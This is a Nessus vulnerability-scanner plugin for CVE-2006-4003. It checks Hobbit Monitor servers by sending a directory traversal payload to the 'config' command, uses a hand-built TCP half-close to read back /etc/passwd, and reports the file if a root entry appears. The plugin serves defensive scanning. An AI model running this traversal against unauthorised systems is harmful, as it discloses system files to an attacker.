#
# (C) Tenable Network Security, Inc.
#

if (NASL_LEVEL < 2202) exit(0);


include("compat.inc");

if (description)
{
  script_id(22181);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2006-4003");
  script_bugtraq_id(19317);
  script_osvdb_id(27752);

  script_name(english:"Hobbit Monitor config Method Traversal Arbitrary File Access");
  script_summary(english:"Tries to read a local file using hobbitd");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote server is affected by an information disclosure
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of the Hobbit Monitor daemon installed on the remote host
does not properly filter the argument to the 'config' command of
directory traversal sequences.  An unauthenticated attacker can
leverage this flaw to retrieve arbitrary files from the affected host
subject to the privileges of the user id under which hobbitd runs." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/442036/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Hobbit version 4.1.2p2 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/08/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/08/02");
 script_cvs_date("$Date: 2015/09/24 21:08:39 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("hobbitd_detect.nasl");
  script_require_ports("Services/hobbitd", 1984);

  exit(0);
}


include("raw.inc");


port = get_kb_item("Services/hobbitd");
if (!port) port = 1984;
if (!get_port_state(port)) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);


# Try to exploit the flaw to retrieve a local file.
file = "../../../../../../../../../../etc/passwd";
filter = string("tcp and src ", get_host_ip(), " and src port ", port);
res = send_capture(socket:soc, data:string("config ", file), pcap_filter:filter);
if (res == NULL) exit(0);
flags = get_tcp_element(tcp:res, element:"th_flags");
if (flags & TH_ACK == 0) exit(0);


# Half-close the connection so the server will send the results.
ip = ip();
seq = get_tcp_element(tcp:res, element:"th_ack");
tcp = tcp(
  th_dport : port,
  th_sport : get_source_port(soc),
  th_seq   : seq,
  th_ack   : seq,
  th_win   : get_tcp_element(tcp:res, element:"th_win"),
  th_flags : TH_FIN|TH_ACK
);
halfclose = mkpacket(ip, tcp);
send_packet(halfclose, pcap_active:FALSE);
res = recv(socket:soc, length:65535);
if (res == NULL) exit(0);


# There's a problem if there's an entry for root.
if (egrep(pattern:"root:.*:0:[01]:", string:res))
{
  report = string(
    "\n",
    "Here are the repeated contents of the file '/etc/passwd'\n",
    "that Nessus was able to read from the remote host :\n",
    "\n",
    res
  );
  security_warning(port:port, extra:report);
}
